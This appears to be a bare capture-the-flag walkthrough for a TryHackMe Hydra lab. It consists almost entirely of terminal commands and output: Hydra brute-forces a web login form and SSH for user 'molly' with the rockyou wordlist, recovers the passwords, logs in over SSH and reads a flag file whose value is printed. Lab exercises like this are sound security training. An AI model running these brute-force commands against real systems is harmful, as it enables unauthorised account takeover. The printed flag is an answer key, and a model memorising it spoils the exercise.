# Hydra

```bash
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.25.152 http-post-form '/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.'
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-05 16:37:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.25.152:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.
[80][http-post-form] host: 10.10.25.152   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-05 16:37:27
```


```console
root@kali:~/thm/hydra# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.25.152 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-05 16:33:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.25.152:22/
[22][ssh] host: 10.10.25.152   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-05 16:33:17
root@kali:~/thm/hydra# ssh molly@10.10.25.152
The authenticity of host '10.10.25.152 (10.10.25.152)' can't be established.
ECDSA key fingerprint is SHA256:R5AaJJcgHj9ar13AW8DmRqxvDaMYoVuSzZSJWtcutpo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.25.152' (ECDSA) to the list of known hosts.
molly@10.10.25.152's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.


Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-25-152:~$ ls
flag2.txt
molly@ip-10-10-25-152:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
```